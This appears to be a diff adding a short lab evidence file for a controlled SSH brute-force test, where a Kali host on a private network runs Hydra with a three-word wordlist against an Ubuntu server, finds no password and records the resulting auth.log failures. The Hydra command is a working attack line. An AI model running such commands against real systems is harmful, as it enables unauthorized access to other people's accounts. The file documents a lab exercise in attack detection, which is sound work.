@@ -1,0 +1,27 @@
+Phase 1 Attack Evidence (Controlled)
+
+Target:
+- Ubuntu Server SSH (192.168.56.20:22)
+
+Attacker:
+- Kali Linux (192.168.56.30)
+
+Connectivity Check (Kali -> Ubuntu):
+- ping -c 4 192.168.56.20
+- Result: 4 received, 0% packet loss
+
+Wordlist Used (3 guesses):
+password
+123456
+letmein
+
+Hydra Command:
+hydra -l bader -P pw.txt ssh://192.168.56.20 -t 4 -V
+
+Hydra Result:
+- 0 valid passwords found
+
+Ubuntu Observations (/var/log/auth.log):
+- Authentication failures observed from rhost=192.168.56.30
+- Failed password entries for user bader
+- Connection closed messages during pre-authentication
